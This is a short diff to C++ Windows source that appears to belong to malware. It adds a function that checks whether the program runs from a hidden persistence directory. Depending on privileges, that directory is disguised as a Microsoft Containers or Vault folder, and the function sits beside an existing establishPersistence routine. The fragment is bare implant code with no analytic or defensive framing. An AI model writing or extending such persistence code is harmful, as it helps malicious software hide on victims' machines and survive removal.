@@ -31,7 +31,15 @@ std::wstring getExecutablePath() {
 }
 
 } // namespace
-
+bool isRunningFromPersistence() {
+    std::wstring sourcePath = getExecutablePath();
+    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
+    const wchar_t* userPath = L"%LOCALAPPDATA%\\Microsoft\\Vault";
+    const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
+    wchar_t expandedDir[MAX_PATH];
+    ExpandEnvironmentStringsW(persistDir, expandedDir, MAX_PATH);
+    return wcsstr(sourcePath.c_str(), expandedDir) != nullptr;
+}
 void establishPersistence() {
     std::wstring sourcePath = getExecutablePath();
 
